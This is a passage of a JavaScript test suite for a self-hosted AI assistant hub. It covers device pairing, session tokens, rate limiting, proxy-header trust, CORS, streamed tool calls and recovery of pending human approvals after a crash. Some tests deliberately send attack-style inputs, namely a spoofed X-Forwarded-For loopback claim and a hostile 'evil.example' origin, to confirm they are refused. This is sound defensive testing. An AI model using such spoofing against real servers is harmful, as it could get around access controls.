  check('auth: every other API endpoint is gated', auth.isAuthExemptPath('GET', '/api/settings') === false && auth.isAuthExemptPath('POST', '/api/bots') === false);

  const cookieHeader = auth.sessionCookieHeader('abc123');
  check(
    'auth: the session cookie is HttpOnly, SameSite=Lax, Path=/ and long-lived',
    /^desk_session=abc123/.test(cookieHeader) && /HttpOnly/.test(cookieHeader) && /SameSite=Lax/.test(cookieHeader) && /Path=\//.test(cookieHeader) && /Max-Age=31536000/.test(cookieHeader),
    cookieHeader,
  );

  const limiter = auth.createRateLimiter({ limit: 3, windowMs: 1000 });
  check('auth: the rate limiter allows the first attempts', limiter.check('ip').allowed && limiter.check('ip').allowed && limiter.check('ip').allowed);
  check('auth: the rate limiter blocks after the limit', limiter.check('ip').allowed === false);
  check('auth: the rate limiter is per client', limiter.check('other-ip').allowed === true);

  // --- per-device sessions (data/devices.json) -----------------------------
  const store = devicesMod.createDeviceStore();
  const first = store.add({ name: 'iPhone', ip: '192.0.2.10' });
  const second = store.add({ name: 'Android 手机', ip: '192.0.2.11' });

  check(
    'devices: a paired device gets its own session token, never the master one',
    Boolean(first.sessionToken) && first.sessionToken !== security.token && first.sessionToken.length >= 32,
    first.sessionToken,
  );
  check(
    'devices: the list shows metadata but no token',
    store.list().length === 2 && store.list().every((d) => !('tokenHash' in d) && !('sessionToken' in d) && Boolean(d.name)),
    JSON.stringify(store.list()),
  );
  check('devices: a session token finds its device', store.findBySession(first.sessionToken)?.id === first.device.id);
  check('devices: an unknown session token finds nothing', store.findBySession('f'.repeat(64)) === null);

  const viaDevice = auth.evaluateAuth(
    { socket: { remoteAddress: '192.0.2.10' }, headers: { cookie: `desk_session=${first.sessionToken}` } },
    security,
    store,
  );
  check(
    'auth: a LAN client holding a device session is authorized as a device',
    viaDevice.authorized === true && viaDevice.mode === 'cookie' && viaDevice.deviceId === first.device.id,
    JSON.stringify(viaDevice),
  );

  check('devices: removing one device succeeds', store.remove(first.device.id) === true);
  check('devices: removing the same device twice is a no-op', store.remove(first.device.id) === false);
  const afterRevoke = auth.evaluateAuth(
    { socket: { remoteAddress: '192.0.2.10' }, headers: { cookie: `desk_session=${first.sessionToken}` } },
    security,
    store,
  );
  check('auth: a revoked device session stops working at once', afterRevoke.authorized === false, JSON.stringify(afterRevoke));
  check(
    'auth: revoking one device leaves the other one paired',
    auth.evaluateAuth(
      { socket: { remoteAddress: '192.0.2.11' }, headers: { cookie: `desk_session=${second.sessionToken}` } },
      security,
      store,
    ).authorized === true,
  );

  check(
    'devices: names come from the user agent',
    devicesMod.describeAgent('Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X)') === 'iPhone' &&
      devicesMod.describeAgent('Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 Mobile Safari/537.36') === 'Android 手机' &&
      devicesMod.describeAgent('Mozilla/5.0 (Linux; Android 14; SM-X910) AppleWebKit/537.36') === 'Android 平板' &&
      devicesMod.describeAgent('Mozilla/5.0 (Windows NT 10.0; Win64; x64)') === 'Windows 电脑上的浏览器',
    devicesMod.describeAgent('Mozilla/5.0 (Windows NT 10.0; Win64; x64)'),
  );

  // --- one-time pairing links (what the QR code carries) -------------------
  let clock = 1_000_000;
  const links = auth.createPairLinkStore({ now: () => clock });
  const link = links.create();
  check(
    'pair links: the token is long, URL-safe and expires in ten minutes',
    link.token.length >= 40 && /^[A-Za-z0-9_-]+$/.test(link.token) && link.expiresAt - clock === 600_000,
    `${link.token.length} ${link.expiresAt - clock}`,
  );
  check('pair links: a fresh token redeems once', Boolean(links.consume(link.token)));
  check('pair links: the second redemption fails (single use)', links.consume(link.token) === null);
  check('pair links: an unknown token fails', links.consume('nope') === null);

  const stale = links.create();
  clock += 600_001;
  check('pair links: an expired token fails', links.consume(stale.token) === null);
  check('pair links: expired links are dropped from memory', links.size === 0, `${links.size}`);

  // --- behind a reverse proxy (Caddy / tunnel) ------------------------------
  const proxyOff = auth.clientIp(
    { socket: { remoteAddress: '127.0.0.1' }, headers: { 'x-forwarded-for': '192.0.2.55' } },
    { trustProxy: false },
  );
  check('proxy: X-Forwarded-For is ignored unless proxying is turned on', proxyOff === '127.0.0.1', proxyOff);

  const proxyOn = auth.clientIp(
    { socket: { remoteAddress: '127.0.0.1' }, headers: { 'x-forwarded-for': '192.0.2.55, 10.0.0.1' } },
    { trustProxy: true },
  );
  check('proxy: a local proxy may name the client (first hop wins)', proxyOn === '192.0.2.55', proxyOn);

  const spoofed = auth.clientIp(
    { socket: { remoteAddress: '198.51.100.7' }, headers: { 'x-forwarded-for': '127.0.0.1' } },
    { trustProxy: true },
  );
  check(
    'proxy: a remote client cannot claim to be loopback (fails closed)',
    spoofed === '198.51.100.7',
    spoofed,
  );

  const secretOk = auth.clientIp(
    {
      socket: { remoteAddress: '198.51.100.7' },
      headers: { 'x-forwarded-for': '192.0.2.55', 'x-nightshift-proxy': 'shared-secret' },
    },
    { trustProxy: true, proxySecret: 'shared-secret' },
  );
  check('proxy: an off-box proxy with the shared secret is trusted', secretOk === '192.0.2.55', secretOk);

  check(
    'proxy: a TLS connection is recognised',
    auth.isSecureRequest({ socket: { encrypted: true }, headers: {} }, { trustProxy: false }) === true,
  );
  check(
    'proxy: X-Forwarded-Proto https from the local proxy counts as secure',
    auth.isSecureRequest(
      { socket: { remoteAddress: '127.0.0.1' }, headers: { 'x-forwarded-proto': 'https' } },
      { trustProxy: true },
    ) === true,
  );
  check(
    'proxy: X-Forwarded-Proto is ignored when proxying is off',
    auth.isSecureRequest(
      { socket: { remoteAddress: '192.0.2.9' }, headers: { 'x-forwarded-proto': 'https' } },
      { trustProxy: false },
    ) === false,
  );
  check(
    'auth behind a proxy: a proxied remote client without a credential is still gated',
    auth.evaluateAuth(
      { socket: { remoteAddress: '127.0.0.1' }, headers: { 'x-forwarded-for': '192.0.2.55' } },
      security,
      store,
      { trustProxy: true },
    ).authorized === false,
  );

  // --- the native app's Bearer token ---------------------------------------
  const appStore = devicesMod.createDeviceStore();
  const appDevice = appStore.add({ name: 'Nightshift/1.2.42 (Android)', ip: '192.0.2.60' });
  check(
    'app: a device session token works as a Bearer credential',
    auth.evaluateAuth(
      { socket: { remoteAddress: '192.0.2.60' }, headers: { authorization: `Bearer ${appDevice.sessionToken}` } },
      security,
      appStore,
    ).authorized === true,
  );
  check(
    'app: that Bearer token is not the master token',
    appDevice.sessionToken !== security.token,
  );
  appStore.remove(appDevice.device.id);
  check(
    'app: removing the device kills its Bearer token too',
    auth.evaluateAuth(
      { socket: { remoteAddress: '192.0.2.60' }, headers: { authorization: `Bearer ${appDevice.sessionToken}` } },
      security,
      appStore,
    ).authorized === false,
  );
}

async function scenarioPairing() {
  const pairing = await api('/api/pairing');
  check('GET /api/pairing returns a url and a code for the local user', pairing.status === 200 && Boolean(pairing.json?.url) && Boolean(pairing.json?.code), pairing.text.slice(0, 200));
  const code = pairing.json.code;
  check('the pairing code is short and random-looking', /^\d{8}$/.test(code), code);
  check(
    'a loopback-only hub says it cannot take a phone yet instead of minting a dead link',
    pairing.json?.remote === false && Array.isArray(pairing.json?.urls) && pairing.json.urls.length === 0,
    pairing.text.slice(0, 200),
  );
  const noLink = await api('/api/pairing/link', { method: 'POST' });
  check(
    'asking for a QR link on a loopback-only hub fails with a reason the UI can show',
    noLink.status === 409 && noLink.json?.error?.code === 'REMOTE_DISABLED',
    noLink.text.slice(0, 240),
  );

  const wrong = await api('/api/pair', { method: 'POST', body: { code: '00000000' } });
  check('a wrong pairing code is rejected', wrong.status === 401 && wrong.json?.error?.code === 'PAIR_INVALID_CODE', wrong.text.slice(0, 200));

  const ok = await api('/api/pair', { method: 'POST', body: { code } });
  const setCookie = ok.headers.get('set-cookie') || '';
  check('the right pairing code pairs the client', ok.status === 200 && ok.json?.ok === true, ok.text.slice(0, 200));
  check(
    'pairing sets an HttpOnly SameSite=Lax session cookie',
    /desk_session=/.test(setCookie) && /HttpOnly/i.test(setCookie) && /SameSite=Lax/i.test(setCookie) && /Path=\//.test(setCookie) && /Max-Age=31536000/.test(setCookie),
    setCookie,
  );
  check(
    'pairing with the 8-digit code also gives the device its own session',
    /^desk_session=[0-9a-f]{64};/.test(setCookie) && Boolean(ok.json?.device?.id),
    `${setCookie} ${JSON.stringify(ok.json?.device)}`,
  );

  const devices = await api('/api/devices');
  check(
    'the paired device is listed with a name and a last-seen time',
    devices.status === 200 && devices.json?.devices?.length === 1 && Boolean(devices.json.devices[0].name) && Boolean(devices.json.devices[0].lastSeenAt),
    devices.text.slice(0, 240),
  );
  const deviceId = devices.json?.devices?.[0]?.id;
  const revoked = await api(`/api/devices/${deviceId}`, { method: 'DELETE' });
  check('a device can be removed from the list', revoked.status === 200 && revoked.json?.ok === true, revoked.text.slice(0, 200));
  check('the list is empty right after the removal', (await api('/api/devices')).json?.devices?.length === 0);
  const missing = await api('/api/devices/no-such-device', { method: 'DELETE' });
  check('removing a device that does not exist is a 404', missing.status === 404 && missing.json?.error?.code === 'DEVICE_NOT_FOUND', missing.text.slice(0, 200));

  // --- switching machines from a paired phone --------------------------------
  const machines = await api('/api/machines');
  const selfEntry = (machines.json?.machines || []).find((m) => m.self);
  check(
    'GET /api/machines lists this machine first',
    machines.status === 200 && Boolean(selfEntry) && selfEntry.online === true,
    machines.text.slice(0, 240),
  );
  check(
    'the machine list never carries a peer token',
    !/token|Bearer/i.test(machines.text),
    machines.text.slice(0, 240),
  );
  const unknownHandoff = await api('/api/machines/no-such-machine/handoff', { method: 'POST' });
  check(
    'a handoff to a machine that does not exist is a 404',
    unknownHandoff.status === 404 && unknownHandoff.json?.error?.code === 'MACHINE_NOT_FOUND',
    unknownHandoff.text.slice(0, 200),
  );

  // --- the native app (its own origin, Bearer token, no cookies) --------------
  const fromApp = await api('/api/bots', { headers: { origin: 'https://localhost' } });
  check(
    'an app origin is allowed to call the API',
    fromApp.headers.get('access-control-allow-origin') === 'https://localhost',
    fromApp.headers.get('access-control-allow-origin') || 'no ACAO',
  );
  const fromWeb = await api('/api/bots', { headers: { origin: 'https://evil.example' } });
  check(
    'any other origin gets no CORS permission',
    !fromWeb.headers.get('access-control-allow-origin'),
    fromWeb.headers.get('access-control-allow-origin') || 'none',
  );
  const preflight = await fetch(`${base}/api/pair`, {
    method: 'OPTIONS',
    headers: { origin: 'https://localhost', 'access-control-request-headers': 'authorization,content-type' },
  });
  check(
    'the app preflight answers 204 and allows the Authorization header',
    preflight.status === 204 && /authorization/i.test(preflight.headers.get('access-control-allow-headers') || ''),
    `${preflight.status} ${preflight.headers.get('access-control-allow-headers')}`,
  );
  const appPair = await api('/api/pair', {
    method: 'POST',
    body: { code: pairing.json.code, client: 'app' },
    headers: { origin: 'https://localhost', 'user-agent': 'Nightshift/1.2.42 (Android)' },
  });
  check(
    'an app that says so gets its own session token in the body',
    appPair.status === 200 && /^[0-9a-f]{64}$/.test(appPair.json?.token || '') && Boolean(appPair.json?.device?.id),
    appPair.text.slice(0, 200),
  );
  const withToken = await api('/api/settings', {
    headers: { origin: 'https://localhost', authorization: `Bearer ${appPair.json?.token}` },
  });
  check(
    'that token works as a Bearer credential',
    withToken.status === 200 && Boolean(withToken.json?.app?.version),
    withToken.text.slice(0, 200),
  );
  await api(`/api/devices/${appPair.json?.device?.id}`, { method: 'DELETE' });
  // Revocation itself is checked at unit level (scenarioAuth): every request in
  // this suite comes from loopback, which is authorized whatever it carries.

  const authInfo = await api('/api/auth');
  check(
    'GET /api/auth reports local mode on loopback',
    authInfo.status === 200 && authInfo.json?.authorized === true && authInfo.json?.mode === 'local' && authInfo.json?.required === false,
    authInfo.text,
  );

  // Wrong attempts already spent two of the five permits; spend the rest.
  for (let i = 0; i < 3; i += 1) await api('/api/pair', { method: 'POST', body: { code: 'ffffffff' } });
  const limited = await api('/api/pair', { method: 'POST', body: { code } });
  check('pairing is rate-limited to 5 attempts per minute', limited.status === 429 && limited.json?.error?.code === 'PAIR_RATE_LIMITED', limited.text.slice(0, 200));
}

/**
 * The phone flow end to end: a hub that actually listens on the network mints a
 * QR link, the phone redeems it once, shows up in Settings, and can be removed.
 * A second server on a throw-away home keeps this away from every other stage.
 */
async function scenarioPairingLink() {
  const remoteHome = await fsp.mkdtemp(path.join(os.tmpdir(), 'assist-smoke-phone-'));
  await seedHome(remoteHome);
  let started = null;
  const savedBase = base;
  try {
    started = await startServerChild(remoteHome, {
      HOST: '0.0.0.0',
      ASSIST_ALLOW_REMOTE: '1',
      ASSIST_DATA_DIR: path.join(remoteHome, 'data'),
      ASSIST_WORKSPACE_DIR: path.join(remoteHome, 'workspace'),
    });
    base = started.url;

    const info = await api('/api/pairing');
    check(
      'a hub listening on the network reports that it can take a phone',
      info.json?.remote === true && Array.isArray(info.json?.urls) && info.json.urls.length >= 1,
      info.text.slice(0, 240),
    );
    check(
      'the phone addresses are a LAN one and, when on a tailnet, a Tailscale one',
      info.json?.urls?.every((u) => /^http:\/\/(\d{1,3}\.){3}\d{1,3}:\d+$/.test(u.url) && (u.kind === 'lan' || u.kind === 'tailnet')),
      JSON.stringify(info.json?.urls),
    );

    const made = await api('/api/pairing/link', { method: 'POST' });
    check(
      'Settings can mint a QR link',
      made.status === 200 && Boolean(made.json?.url) && Boolean(made.json?.expiresAt),
      made.text.slice(0, 240),
    );
    check(
      'the link carries a one-time token in ?pair=',
      /[?&]pair=[A-Za-z0-9_-]{40,}/.test(made.json?.url || ''),
      made.json?.url,
    );
    check(
      'the link says how long it lives (ten minutes)',
      made.json?.expiresInSec > 500 && made.json?.expiresInSec <= 600,
      String(made.json?.expiresInSec),
    );

    {
      // One QR for every address: LAN first, the rest as alt=, same one-time token.
      const qr = made.json?.qr ? new URL(made.json.qr) : null;
      const links = made.json?.links || [];
      const lan = links.find((l) => l.kind === 'lan');
      const others = links.filter((l) => l !== (lan || links[0])).map((l) => new URL(l.url).origin);
      check(
        'auto address: the QR carries every address (LAN first, the others as alt=) with the same token',
        Boolean(qr) && qr.searchParams.get('pair') === new URL(made.json.url).searchParams.get('pair')
          && qr.origin === new URL((lan || links[0]).url).origin
          && JSON.stringify(qr.searchParams.getAll('alt')) === JSON.stringify(others),
        made.json?.qr,
      );
    }

    const token = new URL(made.json.url).searchParams.get('pair');
    const paired = await api('/api/pair', {
      method: 'POST',
      body: { code: token },
      headers: { 'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15' },
    });
    const setCookie = paired.headers.get('set-cookie') || '';
    check(
      'scanning the link pairs the phone without typing anything',
      paired.status === 200 && /^desk_session=[0-9a-f]{64};/.test(setCookie),
      `${paired.status} ${setCookie}`,
    );
    check(
      'the new device is named after the phone',
      paired.json?.device?.name === 'iPhone',
      JSON.stringify(paired.json?.device),
    );

    const replayed = await api('/api/pair', { method: 'POST', body: { code: token } });
    check(
      'the same link cannot pair a second device',
      replayed.status === 401 && replayed.json?.error?.code === 'PAIR_INVALID_LINK',
      replayed.text.slice(0, 240),
    );

    const list = await api('/api/devices');
    check(
      'the phone shows up in the device list once',
      list.json?.devices?.length === 1 && list.json.devices[0].name === 'iPhone',
      list.text.slice(0, 240),
    );
    check(
      'the device list never contains a session token or its hash',
      !/desk_session/.test(list.text) && !/tokenHash/.test(list.text) && !/[0-9a-f]{64}/.test(list.text),
      list.text.slice(0, 240),
    );

    const onDisk = JSON.parse(await fsp.readFile(path.join(remoteHome, 'data', 'devices.json'), 'utf8'));
    check(
      'devices.json stores only a hash of the session token',
      Array.isArray(onDisk?.devices) && onDisk.devices.length === 1 && /^[0-9a-f]{64}$/.test(onDisk.devices[0].tokenHash || '') && !('sessionToken' in onDisk.devices[0]),
      JSON.stringify(onDisk).slice(0, 200),
    );

    const revoked = await api(`/api/devices/${list.json.devices[0].id}`, { method: 'DELETE' });
    check('removing the phone succeeds', revoked.status === 200 && revoked.json?.ok === true, revoked.text.slice(0, 200));
    check('the device list is empty after removing the phone', (await api('/api/devices')).json?.devices?.length === 0);
  } finally {
    base = savedBase;
    if (started) await stopProcess(started.child);
    await fsp.rm(remoteHome, { recursive: true, force: true }).catch(() => {});
  }
}

async function scenarioMockStreaming() {
  const stream = await openStream('chief');
  let turn;
  try {
    turn = await runTurn('chief', 'Hello, what can you do?', stream);
  } finally {
    stream.close();
  }

  check('a plain chat turn completes', turn.status === 'success', turn.status);
  const deltas = turn.events.filter((e) => e.type === 'message.delta');
  const message = turn.events.find((e) => e.type === 'message' && e.final);
  check('the mock provider emits several deltas', deltas.length >= 2, `${deltas.length}`);
  check(
    'mock deltas concatenate to the final message',
    Boolean(message) && deltas.map((d) => d.text).join('') === message.text,
    JSON.stringify(message?.text || '').slice(0, 80),
  );
  check(
    'delta offsets are increasing character indexes',
    deltas.every((d, i) => (i === 0 ? d.index === 0 : d.index === deltas[i - 1].index + deltas[i - 1].text.length)),
    deltas.map((d) => d.index).join(','),
  );
  const firstDelta = turn.events.findIndex((e) => e.type === 'message.delta');
  const finalIndex = turn.events.findIndex((e) => e.type === 'message' && e.final);
  check('deltas arrive before the final message event', firstDelta >= 0 && finalIndex > firstDelta, `${firstDelta} vs ${finalIndex}`);
}

/**
 * A fake OpenAI-compatible endpoint, in-process, on 127.0.0.1. It speaks real
 * SSE (frames deliberately split across TCP writes) and a plain JSON response
 * for the non-streaming settings test. No network access, no API key.
 */
async function startFakeProvider() {
  const http = await import('node:http');
  const seen = [];

  const server = http.createServer(async (req, res) => {
    let raw = '';
    for await (const chunk of req) raw += chunk;
    let body = {};
    try {
      body = JSON.parse(raw || '{}');
    } catch {
      body = {};
    }
    seen.push(body);
    const hasToolResult = Array.isArray(body.messages) && body.messages.some((m) => m.role === 'tool');

    if (body.stream === true) {
      res.writeHead(200, { 'content-type': 'text/event-stream; charset=utf-8', 'cache-control': 'no-cache' });
      res.write(': fake provider\n\n');
      const send = (payload) => res.write(`data: ${JSON.stringify(payload)}\n\n`);
      send({ choices: [{ index: 0, delta: { role: 'assistant' } }] });

      if (!hasToolResult) {
        // A thinking model emits its reasoning first. It must not reach the UI
        // as text, and it must be echoed back on the following request.
        send({ choices: [{ index: 0, delta: { reasoning_content: 'I should list the workspace.' } }] });
        // "think-then-call" asks for the shape that used to break the agent: one
        // reply that carries BOTH text and a tool call. Splitting that into two
        // assistant messages is what DeepSeek's thinking mode rejects with a 400.
        const lastUser = [...(body.messages || [])].reverse().find((m) => m.role === 'user');
        if (String(lastUser?.content || '').includes('think-then-call')) {
          send({ choices: [{ index: 0, delta: { content: 'Let me look. ' } }] });
        }
        // A tool call whose arguments arrive as fragments, plus an id/name frame.
        send({
          choices: [
            {
              index: 0,
              delta: {
                tool_calls: [{ index: 0, id: 'call_fake_1', type: 'function', function: { name: 'fs_list', arguments: '' } }],
              },
            },
          ],
        });
        for (const part of ['{"pa', 'th":', ' ".', '"}']) {
          await sleep(2);
          send({ choices: [{ index: 0, delta: { tool_calls: [{ index: 0, function: { arguments: part } }] } }] });
        }
        send({ choices: [{ index: 0, delta: {}, finish_reason: 'tool_calls' }] });
        res.write('data: [DONE]\n\n');
        res.end();
        return;
      }

      // Content, with the first frame split in half across two writes.
      const pieces = ['All ', 'done: ', 'three ', 'files.'];
      for (const [index, piece] of pieces.entries()) {
        const frame = `data: ${JSON.stringify({ choices: [{ index: 0, delta: { content: piece } }] })}\n\n`;
        if (index === 0) {
          const cut = Math.floor(frame.length / 2);
          res.write(frame.slice(0, cut));
          await sleep(5);
          res.write(frame.slice(cut));
        } else {
          res.write(frame);
        }
        await sleep(2);
      }
      send({ choices: [{ index: 0, delta: {}, finish_reason: 'stop' }], usage: { prompt_tokens: 3, completion_tokens: 5 } });
      res.write('data: [DONE]\n\n');
      res.end();
      return;
    }

    // Non-streaming (the settings connection test).
    res.writeHead(200, { 'content-type': 'application/json' });
    res.end(JSON.stringify({ choices: [{ index: 0, message: { role: 'assistant', content: 'OK' }, finish_reason: 'stop' }], usage: { total_tokens: 1 } }));
  });

  await new Promise((resolve) => server.listen(0, '127.0.0.1', resolve));
  const { port } = server.address();
  return {
    baseUrl: `http://127.0.0.1:${port}/v1`,
    seen,
    close: () => new Promise((resolve) => server.close(resolve)),
  };
}

const FAKE_TOOLS = [
  {
    type: 'function',
    function: { name: 'fs_list', description: 'List a directory', parameters: { type: 'object', properties: { path: { type: 'string' } } } },
  },
];

async function scenarioStreamingParser({ modelMod }) {
  const fake = await startFakeProvider();
  try {
    const client = modelMod.createModel({ provider: 'openai', baseUrl: fake.baseUrl, apiKey: 'test-key', model: 'fake-1' });

    // 1. Tool-call deltas are re-assembled by index.
    const deltas = [];
    const toolResult = await client.complete([{ role: 'user', content: 'list the workspace' }], {
      tools: FAKE_TOOLS,
      onDelta: (delta) => deltas.push(delta.text),
    });
    check(
      'the SSE parser re-assembles streamed tool calls',
      toolResult.toolCalls?.length === 1 && toolResult.toolCalls[0].name === 'fs_list' && toolResult.toolCalls[0].arguments?.path === '.',
      JSON.stringify(toolResult),
    );
    check('the streamed tool call keeps its id', toolResult.toolCalls?.[0]?.id === 'call_fake_1', toolResult.toolCalls?.[0]?.id);
    check('a tool-call-only stream emits no text deltas', deltas.length === 0, deltas.join('|'));
    check(
      'reasoning_content is captured from the delta stream',
      toolResult.reasoningContent === 'I should list the workspace.',
      JSON.stringify(toolResult.reasoningContent),
    );
    check('the provider sees stream:true in the request body', fake.seen[0]?.stream === true);

    // 2. Content deltas, including a frame split across TCP writes.
    deltas.length = 0;
    const textResult = await client.complete(
      [
        { role: 'user', content: 'summarise' },
        {
          role: 'assistant',
          content: '',
          reasoning_content: 'prior thought',
          tool_calls: [{ id: 'call_1', type: 'function', function: { name: 'fs_list', arguments: '{}' } }],
        },
        { role: 'tool', tool_call_id: 'call_1', content: '{"ok":true}' },
      ],
      { tools: FAKE_TOOLS, onDelta: (delta) => deltas.push(delta.text) },
    );
    check('content deltas arrive in order', deltas.join('') === 'All done: three files.', deltas.join('|'));
    check('a frame split across TCP writes is still parsed', deltas[0] === 'All ', deltas[0]);
    check('the stream reports its finish reason', textResult.finishReason === 'stop', textResult.finishReason);
    check('streamed text is returned whole for the transcript', textResult.content === 'All done: three files.', textResult.content);

    // DeepSeek rejects the follow-up request unless the assistant message that
    // produced the tool call carries its reasoning_content back verbatim.
    const wireAssistant = (fake.seen.at(-1).messages || []).find((m) => m.role === 'assistant' && m.tool_calls);
    check(
      'assistant reasoning_content is replayed on the wire',
      wireAssistant?.reasoning_content === 'prior thought',
      JSON.stringify(wireAssistant || null),
    );
    check('tool_calls are still sent alongside it', Array.isArray(wireAssistant?.tool_calls) && wireAssistant.tool_calls.length === 1);

    // 3. End to end: point the live server at the fake provider and run a turn.
    const before = fake.seen.length;
    const put = await api('/api/settings', {
      method: 'PUT',
      body: { provider: 'openai', baseUrl: fake.baseUrl, model: 'fake-1', apiKey: 'sk-fake-key' },
    });
    check('settings can point the live model at a real endpoint', put.status === 200 && put.json?.model?.hasKey === true, put.text.slice(0, 160));

    const tested = await api('/api/settings/test', { method: 'POST', body: {} });
    check(
      'POST /api/settings/test performs a live completion and times it',
      tested.status === 200 && tested.json?.ok === true && tested.json?.mode === 'live' && typeof tested.json?.latencyMs === 'number',
      tested.text.slice(0, 200),
    );

    const stream = await openStream('chief');
    let turn;
    try {
      turn = await runTurn('chief', 'stream through the fake provider please', stream);
    } finally {
      stream.close();
    }
    check('a turn runs against the streaming provider', turn.status === 'success', turn.status);
    check(
      'the streamed tool call actually ran',
      turn.events.some((e) => e.type === 'tool.result' && e.name === 'fs_list' && e.ok === true),
      turn.events.map((e) => e.type).join(','),
    );
    const message = turn.events.find((e) => e.type === 'message' && e.final);
    const turnDeltas = turn.events.filter((e) => e.type === 'message.delta');
    check(
      'provider deltas reach the SSE client and concatenate correctly',
      Boolean(message) && turnDeltas.map((d) => d.text).join('') === message.text && message.text === 'All done: three files.',
      `${JSON.stringify(message?.text || '')} <- ${turnDeltas.map((d) => d.text).join('|')}`,
    );
    check(
      'every request the turn made asked for a stream',
      fake.seen.length > before && fake.seen.slice(before + 1).every((request) => request.stream === true),
      JSON.stringify(fake.seen.slice(before).map((request) => request.stream)),
    );

    // Regression: a reply that carries text AND a tool call must go back as ONE
    // assistant message. Two in a row is exactly what DeepSeek 400s on:
    // "The `reasoning_content` in the thinking mode must be passed back to the API."
    const mergedBefore = fake.seen.length;
    const mergedStream = await openStream('chief');
    try {
      await runTurn('chief', 'think-then-call please', mergedStream);
    } finally {
      mergedStream.close();
    }
    const followUp = fake.seen.slice(mergedBefore).at(-1);
    const roles = (followUp?.messages || []).map((m) => m.role);
    const doubled = roles.some((role, i) => role === 'assistant' && roles[i - 1] === 'assistant');
    check('no two consecutive assistant messages on the wire', !doubled, JSON.stringify(roles));
    const merged = (followUp?.messages || []).find((m) => m.role === 'assistant' && m.tool_calls);
    check(
      'the assistant turn carries its text and its tool_calls together',
      Boolean(merged) && String(merged.content).includes('Let me look.'),
      JSON.stringify(merged || null).slice(0, 200),
    );
    check(
      'the replayed assistant message keeps reasoning_content',
      merged?.reasoning_content === 'I should list the workspace.',
      JSON.stringify(merged?.reasoning_content),
    );

    const backToMock = await api('/api/settings', {
      method: 'PUT',
      body: { provider: 'mock', baseUrl: 'https://api.openai.com/v1', model: 'gpt-4o-mini', apiKey: '' },
    });
    check('the model can be switched back to mock without a restart', backToMock.status === 200 && backToMock.json?.model?.hasKey === false, backToMock.text.slice(0, 160));
  } finally {
    await fake.close();
  }
}

async function scenarioCrashRecovery() {
  const pairingBefore = (await api('/api/pairing')).json;

  const stream = await openStream('ops');
  let post;
  let request;
  try {
    post = await api('/api/bots/ops/message', {
      method: 'POST',
      body: { text: 'Write a note outside the workspace: epsilon' },
    });
    request = await stream.waitFor((e) => e.type === 'approval.request', 10000, 'approval.request before the crash');
  } finally {
    stream.close();
  }
  check('a live turn raised an approval card before the crash', post.status === 200 && Boolean(request?.approvalId));

  const pendingFile = path.join(home, 'data', 'pending.json');
  await waitUntil(async () => {
    const raw = await fsp.readFile(pendingFile, 'utf8').catch(() => '');
    return raw.includes(request.approvalId);
  }, 5000, 'pending.json to contain the card');
  const savedPending = JSON.parse(await fsp.readFile(pendingFile, 'utf8'));
  check('pending approvals are persisted to data/pending.json', savedPending.approvals?.some((a) => a.id === request.approvalId));

  const turnPath = path.join(home, 'data', 'turns', `${post.json.turnId}.json`);
  const running = JSON.parse(await fsp.readFile(turnPath, 'utf8').catch(() => '{}'));
  check('an in-flight turn is persisted with status running', running.status === 'running', JSON.stringify(running).slice(0, 160));

  // A power cut, not a shutdown: no chance to write anything else.
  await killChildHard();
  await sleep(250);

  await bootServer();
  const health = await api('/api/health');
  check('the server restarts on the same data directory', health.status === 200 && health.json?.ok === true);

  const pendingAfter = await api('/api/approvals?status=pending');
  const restoredCard = pendingAfter.json.find((a) => a.id === request.approvalId);
  check('the pending approval survives the restart', Boolean(restoredCard), pendingAfter.text.slice(0, 240));
  check('the restored card is flagged as restored', restoredCard?.restored === true);

  const recovered = JSON.parse(await fsp.readFile(turnPath, 'utf8').catch(() => '{}'));
  check(
    'an interrupted turn becomes needs_attention',
    recovered.status === 'needs_attention' && recovered.interrupted === true,
    JSON.stringify(recovered).slice(0, 200),
  );

  const opsMessages = await api('/api/bots/ops/messages');
  check(
    'the message log explains that the turn was interrupted',
    opsMessages.json.some((m) => m.role === 'assistant' && String(m.text || '').includes('server stopped')),
    opsMessages.text.slice(-300),
  );
  check(
    'the message log shows a needs_attention status item',
    opsMessages.json.some((m) => m.role === 'status' && m.status === 'needs_attention'),
  );

  const decide = await api(`/api/approvals/${request.approvalId}`, {
    method: 'POST',
    body: { decision: 'approve', note: 'after restart' },
  });
  check('a restored card can still be approved', decide.status === 200 && decide.json?.approval?.status === 'approved', decide.text.slice(0, 200));
  check('a late decision is marked late', decide.json?.approval?.late === true);

  const opsAfter = await api('/api/bots/ops/messages');
  check(
    'the restored decision is appended to the transcript',
    opsAfter.json.some((m) => m.role === 'approval' && m.approvalId === request.approvalId && m.decision === 'approved'),
    opsAfter.text.slice(-300),
  );
  check(
    'the message log says the rest of the turn did not resume',
    opsAfter.json.some((m) => m.role === 'assistant' && String(m.text || '').includes('did not resume')),
    opsAfter.text.slice(-300),
  );

  // The one thing a restart can still honour: a live-chat card the human just
  // approved had provably not run yet, so the approved tool call is replayed.
  const outside = await fsp.readFile(path.join(home, 'outside-note.md'), 'utf8').catch(() => '');
  check('approving a restored live-chat card replays the approved tool', outside.includes('epsilon'), outside.slice(0, 120));
  check(
    'the replayed tool result appears in the message log',
    opsAfter.json.some((m) => m.role === 'tool' && m.name === 'fs_write' && m.ok === true),
    opsAfter.text.slice(-300),
  );

  // An unattended (routine) card is answerable, but it never replays work.
  const unattendedCard = pendingAfter.json.find((a) => a.unattended === true);
  if (unattendedCard) {
    const unattendedDecision = await api(`/api/approvals/${unattendedCard.id}`, {
      method: 'POST',
      body: { decision: 'approve', note: 'routine card after restart' },
    });
    check('an unattended restored card can still be answered', unattendedDecision.status === 200, unattendedDecision.text.slice(0, 160));
    const afterUnattended = await fsp.readFile(path.join(home, 'outside-note.md'), 'utf8').catch(() => '');
    check('an unattended restored card never replays work', !afterUnattended.includes('gamma'), afterUnattended.slice(0, 120));
  } else {
    skip('unattended restored card is not replayed', 'no unattended card survived to this point');
  }

  const auditLog = await api('/api/audit?limit=300');
  check('the recovered decision is audited', auditLog.json.some((a) => a.kind === 'approval.resolved' && a.id === request.approvalId));
  check(
    'the replayed tool run is audited',
    auditLog.json.some((a) => a.kind === 'tool.run' && a.restored === true && a.tool === 'fs_write' && a.ok === true),
  );

  const settingsAfter = await api('/api/settings');
  check(
    'settings and the pairing code survive a restart',
    settingsAfter.json?.model?.provider === 'mock' &&
